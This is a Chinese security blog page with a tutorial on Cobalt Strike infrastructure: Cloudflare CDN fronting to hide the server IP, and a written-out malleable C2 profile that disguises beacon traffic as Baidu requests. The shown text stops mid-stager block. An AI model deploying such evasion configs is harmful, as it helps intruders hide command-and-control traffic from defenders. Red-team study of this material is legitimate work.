<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="知行合一">
<meta property="og:type" content="website">
<meta property="og:title" content="藏青&#39;s BLOG">
<meta property="og:url" content="https://cangqingzhe.github.io/page/2/index.html">
<meta property="og:site_name" content="藏青&#39;s BLOG">
<meta property="og:description" content="知行合一">
<meta property="og:locale" content="cn">
<meta property="article:author" content="藏青">
<meta property="article:tag" content="渗透 内网 代码审计">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://cangqingzhe.github.io/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false
  };
</script>

  <title>藏青's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">藏青's BLOG</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/" class="post-title-link" itemprop="url">记基于cobaltstrike基础设施架构设计尝试</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-08 11:11:22" itemprop="dateCreated datePublished" datetime="2020-09-08T11:11:22+08:00">2020-09-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-10-12 10:59:14" itemprop="dateModified" datetime="2020-10-12T10:59:14+08:00">2020-10-12</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
                    <span itemprop="name">cobaltstrike</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        通过之前的介绍我们了解了cobaltstrike的一些混淆或者隐藏的策略，这次我们主要对学到的这些策略进行实践，设计一个比较好用的不容易被反查的方案。</p>
<p>​        设计思路如下：</p>
<ul>
<li><p>自定义mallable c2 profile文件，自定义通讯流量</p>
</li>
<li><p>前置机通过mod_rewrite对不同流量进行不同的转发</p>
</li>
<li><p>给前置机配置CDN保护前置机的真实IP</p>
</li>
<li><p>teamserver主机配置防火墙仅允许前置机和teamserver主机的特定端口通信</p>
<p>因为CDN配置需要等待一段时间才能生效，所以我们先来配置CDN。</p>
</li>
</ul>
<h3 id="cloudflare配置免费CDN"><a href="#cloudflare配置免费CDN" class="headerlink" title="cloudflare配置免费CDN"></a>cloudflare配置免费CDN</h3><p>​        在<a href="https://dash.cloudflare.com/login" target="_blank" rel="noopener">cloudflare</a>提供了免费的CDN,我们可以申请一个账号，登录后首先选择添加站点</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908113445450.png" alt="image-20200908113445450"></p>
<p>​            选择add a site添加我们想要配置CDN的域名后，选择free也就是免费的CND，确定后会来到如下界面，选择continue</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908114452692.png" alt="image-20200908114452692"></p>
<p>​        然后需要我们去我们自己的域名控制台去修改记录。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908114648182.png" alt="image-20200908114648182"></p>
<p>​        我这里的域名是在腾讯云注册的，因此我来到腾讯云的控制台来修改</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908114925213.png" alt="image-20200908114925213"></p>
<p>​        找到注册商这里点击管理</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908115122093.png" alt="image-20200908115122093"></p>
<p>​        对DNS服务器进行修改，修改为cloudflare</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908115215847.png" alt="image-20200908115215847"></p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908115641139.png" alt="image-20200908115641139"></p>
<p>​        将NS记录也做一下修改</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120045948.png" alt="image-20200908120045948"></p>
<p>​        设置好以后我们来到cloudflare，选择确认后会有一些配置，全选择默认就好了。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120217855.png" alt="image-20200908120217855"></p>
<p>​        配置好以后刚开是域名可能还是下面的状态</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120401476.png" alt="image-20200908120401476"></p>
<p>​        点击域名后往下拉，有个re-check的按钮，可以通过这个来检测配置是否生效，这个需要一段时间才可以生效。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120439002.png" alt="image-20200908120439002"></p>
<p>​        稍微等待一会以后，再去查看域名，发现状态变成了active，这说明配置的解析已经生效了</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121034826.png" alt="image-20200908121034826"></p>
<p>​        进入域名以后，我们可以看到这里已经提示配置成功了，我们再去选择DNS对解析记录进行修改</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121124053.png" alt="image-20200908121124053"></p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121316626.png" alt="image-20200908121316626"></p>
<p>​        配置好以后我们再去ping我们的域名可以看到得到的IP是cloudflare节点的IP</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121455393.png" alt="image-20200908121455393"></p>
<h3 id="自定义Mallable-C2-流量"><a href="#自定义Mallable-C2-流量" class="headerlink" title="自定义Mallable C2 流量"></a>自定义Mallable C2 流量</h3><p>​        之前我们了解过关于Mallable C2 profile文件的编写，今天我们尝试着去编写一个profile文件，因为百度在国内用的也比较多，所以我将尝试以百度为例来进行流量混淆。</p>
<p>​        首先是一些是一些基本的配置信息，这些配置和流量本身没有太大关系，所以可以先配置这部分的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;baidu.profile&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;  &#x2F;&#x2F;延时5秒左右</span><br><span class="line">set jitter    &quot;30&quot;;   &#x2F;&#x2F;配置延时的波动百分比，我们这里也控制在百分之30</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;;  &#x2F;&#x2F;user-agent配置</span><br><span class="line"></span><br><span class="line">###SMB options###    &#x2F;&#x2F;smb 命名管道名称的配置</span><br><span class="line">set pipename &quot;ntsvcs&quot;;</span><br><span class="line">set pipename_stager &quot;nbtsvcs&quot;;</span><br></pre></td></tr></table></figure>

<p>​        下来我们要配置一些和百度有关的流量部分的配置,因为我们设置profile文件的目的就是使我们的通信流量模拟百度的通信流量，因此我们首先要分析百度的流量，从中选择比较合适的流量。首先我们先来看下访问百度网站时的请求头的流量。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908144452608.png" alt="image-20200908144452608"></p>
<p>​        我们根据百度的请求头来编写我们配置GET请求部分，下面这部分是客户端和teamserver服务端获取执行命令时的url的配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif&quot;;</span><br><span class="line">    </span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;no-cors&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;image&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29A3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1591203863; BAIDUID&#x3D;7B3B91054F6B7A69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; H_PS_645EC&#x3D;bc01FRkCkZHub5%2Fa5TNP%2Bnfm1rK01EMDjcigAfzJf0hSG5tXtJ5cc%2Fug9m4w3cQnMZxL; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;Keep-Alive&quot;;</span><br><span class="line">	</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​        配置好请求包后我们还要配置返回包,返回包原始内容如下</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908144621899.png" alt="image-20200908144621899"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   server &#123;</span><br><span class="line"></span><br><span class="line">header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">header &quot;Cache-Control&quot; &quot;max-age&#x3D;315360000&quot;;	</span><br><span class="line">header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">header &quot;Date&quot; &quot;Tue, 08 Sep 2020 06:29:52 GMT&quot;;</span><br><span class="line">header &quot;Etag&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">header &quot;Expires&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">header &quot;Last-Modified&quot; &quot;Wed, 06 Jun 2012 05:10:47 GMT&quot;;</span><br><span class="line">header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">       output &#123;</span><br><span class="line">           netbios;</span><br><span class="line">           prepend &quot;                 &quot;;</span><br><span class="line">   		prepend &quot;GIF89a&quot;;</span><br><span class="line">   		append &quot;;&quot;;</span><br><span class="line">           print;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>​        我们再来配置一下http-post，这个主要是用来客户端给服务端返回命令执行的结果。首先我们先要选择一个适合伪装流量的请求，这个流量需要去向服务端发送大量的信息，但是返回信息却不用很多，经过查看发现百度大部分是请求时get请求，有一个请求会发送一个加密的url信息，所以我尝试通过伪造这个url来获取客户端的返回信息。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908150138010.png" alt="image-20200908150138010"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;&#x2F;link&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">       </span><br><span class="line">		header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd&#x3D;%E5%8D%B0%E5%BA%A6%E5%A4%96%E9%95%BF%E5%86%8D%E8%B0%88%E4%B8%AD%E5%8D%B0%E8%BE%B9%E5%A2%83%E7%B4%A7%E5%BC%A0%E5%B1%80%E5%8A%BF&amp;rsv_idx&#x3D;2&amp;tn&#x3D;baiduhome_pg&amp;usm&#x3D;2&amp;ie&#x3D;utf-8&amp;rsv_cq&#x3D;&amp;rsv_dl&#x3D;0_right_fyb_pchot_20811_01&amp;rsf&#x3D;392deae71492ecf08ccf48e0d95afc29_1_15_1&amp;rqid&#x3D;d04f8f9d00035648&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29E3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1592203863; BAIDUID&#x3D;7B3B91054F6B7C69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; ISSW&#x3D;1; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350; H_PS_645EC&#x3D;7f76DbrvJ3OSPPa0yE9HFSBygVDDoW5VRlO3pSIe%2BNw%2FIsO0qfi9%2B7kDdR5DButmXkOX&quot;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">	    parameter &quot;url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;eqid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        parameter &quot;wd&quot; &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">	header &quot;Bdpagetype&quot; &quot;3&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;text&#x2F;html&quot;;	</span><br><span class="line">	header &quot;Server&quot; &quot;BWS&#x2F;1.1&quot;;</span><br><span class="line">	header &quot;Set-Cookie&quot; &quot;BDSVRTM&#x3D;0; path&#x3D;&#x2F;&quot;;</span><br><span class="line">	header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">    header &quot;X-Ua-Compatible&quot; &quot;IE&#x3D;Edge,chrome&#x3D;1&quot;;    </span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        我们再看下该如何配置下载stage的请求，我们知道这个请求会下载一个200多k的一个文件我们先找找有没有下载文件的请求。我们可以去以加载百度logo伪装的流量下载stage</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908152245517.png" alt="image-20200908152245517"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">	set uri_x86 &quot;&#x2F;favicon.ico&quot;;</span><br><span class="line">	set uri_x64 &quot;&#x2F;Favicon.ico&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">	header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; 